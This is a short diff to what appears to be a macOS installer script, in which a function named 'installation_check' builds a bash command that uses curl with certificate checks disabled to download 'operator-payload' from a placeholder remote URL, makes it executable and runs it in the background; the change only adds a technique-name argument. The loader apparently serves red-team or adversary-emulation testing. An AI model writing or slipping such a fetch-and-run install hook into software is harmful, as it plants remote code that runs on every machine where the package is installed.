@@ -18,7 +18,7 @@
 
 function installation_check () {
     // Run a custom script
-    command = "/usr/bin/curl -k 'REMOTE_PAYLOAD_URL' -o /Users/$USER/Library/Application\ Support/operator-payload; chmod +x /Users/$USER/Library/Application\ Support/operator-payload; /Users/$USER/Library/Application\ Support/operator-payload &"
+    command = "/usr/bin/curl -k 'REMOTE_PAYLOAD_URL' -o /Users/$USER/Library/Application\ Support/operator-payload; chmod +x /Users/$USER/Library/Application\ Support/operator-payload; /Users/$USER/Library/Application\ Support/operator-payload -name TECHNIQUE_NAME &"
     exit_code = system.run('/bin/bash', '-c', command);
     if (exit_code != 0) {
         // need to set error type
